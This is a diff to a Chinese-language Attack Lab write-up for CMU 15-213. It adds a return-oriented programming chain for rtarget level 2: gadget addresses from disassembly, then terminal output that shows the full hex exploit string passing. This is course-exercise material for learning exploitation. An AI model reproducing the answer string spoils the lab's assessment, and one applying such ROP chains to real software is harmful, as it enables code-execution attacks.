@@ -525,7 +525,43 @@ nop：0x90,的唯一作用是使程序计数器递增1。
 
 `mov (cookie) %rdi; mov &touch2 (%rsp); ret; `
 
-其中 cookie=0x59b997fa
+->
+
+`mov %rsp %rdi;pop rdi;ret`
+
+`rsp->rax;pop xxx;rax->rdi: (48 89 e0 -> 48 89 c7)`
+
+```asm
+# mov rsp rax
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+# pop rax
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+# mov rax rdi
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+```
+
+
+
+```asm
+root@debian:~/attklab/target1# ./rtarget -q < solve-raw.txt
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:rtarget:2:48 C7 C7 E4 44 60 00 48 C7 44 24 00 FA 18 40 00 C3 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 48 C7 C7 00 00 00 00 90 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
+```
+
+
 
 
 
